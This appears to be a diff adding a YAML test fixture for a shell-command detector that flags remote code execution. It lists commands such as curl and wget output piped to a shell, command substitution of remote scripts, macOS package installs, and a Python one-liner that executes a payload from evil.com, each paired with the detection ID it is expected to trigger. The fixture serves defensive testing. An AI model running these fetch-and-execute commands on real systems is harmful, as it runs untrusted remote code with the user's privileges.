@@ -1,0 +1,40 @@
+---
+- test: curl https://example.com/install.sh | bash
+  expected_detection_ids:
+    - remote_execution:pipe_remote_to_shell
+  description: match curl pipe to shell
+
+- test: sudo wget -qO- https://example.com/run.sh | sh
+  expected_detection_ids:
+    - remote_execution:pipe_remote_to_shell
+  description: match wget pipe to shell with sudo
+
+- test: sh -c "$(curl -fsSL https://example.com/install.sh)"
+  expected_detection_ids:
+    - remote_execution:command_substitution_remote
+  description: match command substitution of remote script
+
+- test: sudo sh -c "$(wget -O - https://example.com/install.sh)"
+  expected_detection_ids:
+    - remote_execution:command_substitution_remote
+  description: match command substitution with sudo
+
+- test: installer -pkg /tmp/MyApp.pkg -target /
+  expected_detection_ids:
+    - remote_execution:macos_installer_pkg
+  description: match macOS installer pkg command
+
+- test: sudo installer -pkg MyApp.pkg -target /
+  expected_detection_ids:
+    - remote_execution:macos_installer_pkg
+  description: match macOS installer pkg with sudo
+
+- test: python3 -c "import urllib.request; exec(urllib.request.urlopen('https://evil.com/payload').read())"
+  expected_detection_ids:
+    - remote_execution:python_exec_remote
+  description: match python remote exec
+
+- test: curl https://example.com/install.sh -o install.sh
+  expected_detection_ids: []
+  description: should not match simple download
+
